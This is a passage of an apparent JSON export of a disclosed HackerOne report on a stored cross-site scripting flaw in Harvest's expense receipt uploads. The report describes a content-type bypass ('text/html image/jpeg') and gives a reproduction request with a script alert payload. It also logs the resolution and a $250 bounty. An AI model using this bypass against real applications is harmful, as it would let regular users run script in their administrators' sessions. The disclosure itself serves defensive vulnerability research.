            "created_at": "2016-10-26T15:20:36.019Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-26T15:20:36.019Z", 
            "actor": {
                "username": "jorgeleria", 
                "url": "/jorgeleria", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/680/3e44968ac3b661792cd01009529cfad463cdf10c_medium.jpg?1459336835"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "harvest", 
            "message": "Hi Edgar,\n\nThanks for your patience and the confirmation.\nI'm moving it to resolved status and we will be awarding  bounty soon.\n\nCheers,\nJorge", 
            "markdown_message": "<p>Hi Edgar,</p>\n\n<p>Thanks for your patience and the confirmation.<br>\nI&#39;m moving it to resolved status and we will be awarding  bounty soon.</p>\n\n<p>Cheers,<br>\nJorge</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1268811, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-10-27T16:24:57.669Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-27T16:24:57.669Z", 
            "actor": {
                "url": "/harvest", 
                "profile": {
                    "name": "Harvest"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/237/6d125866767807c1a1abda02f0ffd805c5928ff4_medium.png?1403079688"
                }
            }, 
            "team_handle": "harvest", 
            "bounty_amount": "250.0", 
            "collaborator": {
                "username": "eboda", 
                "url": "/eboda"
            }, 
            "message": "Thanks for helping make Harvest more secure!", 
            "markdown_message": "<p>Thanks for helping make Harvest more secure!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1271222, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-28T16:40:48.902Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-28T16:40:48.902Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "harvest", 
            "first_to_agree": true, 
            "message": "Thank you for the bounty guys! Mind dislcosing it?", 
            "markdown_message": "<p>Thank you for the bounty guys! Mind dislcosing it?</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1273099, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-27T16:41:01.783Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-27T16:41:01.783Z", 
            "actor": {
                "url": "/harvest", 
                "profile": {
                    "name": "Harvest"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/237/6d125866767807c1a1abda02f0ffd805c5928ff4_medium.png?1403079688"
                }
            }, 
            "team_handle": "harvest", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1321796, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "eboda", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/eboda", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/014/247/f5d06f8f31212f1fcbe5f517ca4059566ca97553_small.png?1515881564"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -63871545.36604298, 
    "disclosed_at": "2016-11-27T16:41:01.760Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/165324", 
    "created_at": "2016-09-02T16:11:24.601Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"summary\">Summary</h2>\n\n<p>Hey there! <br>\nAfter  <a href=\"/reports/152591\">#152591</a> was fixed, I decided to take another look at the attachments and found a new bypass to upload attachments which will be served with a user-controlled <code>Content-type</code>. </p>\n\n<p>The invoices attachments are not vulnerable, as they are all served with <code>Content-Disposition: attachment;</code>. </p>\n\n<p>However, the expense receipts are served inline if we provide a content-type which includes <code>image/jpeg</code>. Then we simply need to force the browser to not interpret it as an image, this can be done by supplying <code>text/html image/jpeg</code> as content-type. The image/jpeg will just be ignored (tested on firefox and chrome).</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n\n<ol>\n<li>Create a new expense and add a receipt.</li>\n<li>\n<p>Intercept the POST request and modify the <code>receipt</code> parameter to look like this:</p>\n<pre class=\"highlight shell\"><code>Content-Disposition: form-data; <span class=\"nv\">name</span><span class=\"o\">=</span><span class=\"s2\">&quot;receipt&quot;</span>; <span class=\"nv\">filename</span><span class=\"o\">=</span><span class=\"s2\">&quot;blabla&quot;</span>\nContent-Type: text/html image/jpeg\n\n&lt;script&gt;alert<span class=\"o\">(</span>document.domain<span class=\"o\">)</span>;&lt;/script&gt;\n</code></pre>\n</li>\n<li><p>It will create the expense and return you a URL for viewing the receipt. Open the url and you should see the XSS</p></li>\n</ol>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Expenses can be created by regular users, therefore they could XSS their admins. However, I don&#39;t see a feature to publicly share an expense like the invoices in <a href=\"/reports/152591\">#152591</a>, so I guess you can not use it to XSS cross-app.</p>\n\n<p><strong>Note</strong>: This bypass works also on the invoices attachments. But since they are served as attachments, no XSS is possible as far as I can tell.</p>\n", 
    "vulnerability_information": "Summary\n------\nHey there! \nAfter  #152591 was fixed, I decided to take another look at the attachments and found a new bypass to upload attachments which will be served with a user-controlled `Content-type`. \n\nThe invoices attachments are not vulnerable, as they are all served with `Content-Disposition: attachment;`. \n\nHowever, the expense receipts are served inline if we provide a content-type which includes `image/jpeg`. Then we simply need to force the browser to not interpret it as an image, this can be done by supplying `text/html image/jpeg` as content-type. The image/jpeg will just be ignored (tested on firefox and chrome).\n\nSteps to reproduce\n------\n1. Create a new expense and add a receipt.\n2. Intercept the POST request and modify the `receipt` parameter to look like this:\n\n    ```{bash}\nContent-Disposition: form-data; name=\"receipt\"; filename=\"blabla\"\nContent-Type: text/html image/jpeg\n\n    <script>alert(document.domain);</script>\n```\n3. It will create the expense and return you a URL for viewing the receipt. Open the url and you should see the XSS\n\nImpact\n-------\nExpenses can be created by regular users, therefore they could XSS their admins. However, I don't see a feature to publicly share an expense like the invoices in #152591, so I guess you can not use it to XSS cross-app.\n\n**Note**: This bypass works also on the invoices attachments. But since they are served as attachments, no XSS is possible as far as I can tell.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://getharvest.com", 
            "about": "Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business.", 
            "twitter_handle": "", 
            "name": "Harvest"
        }, 
        "handle": "harvest", 
        "url": "https://hackerone.com/harvest", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/237/5a435a0bb3e0eb921fa925e824c6ed9d31eefdc8_small.png?1403079688", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/237/6d125866767807c1a1abda02f0ffd805c5928ff4_medium.png?1403079688"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 237, 
        "default_currency": "usd"
    }, 
    "is_published": false
}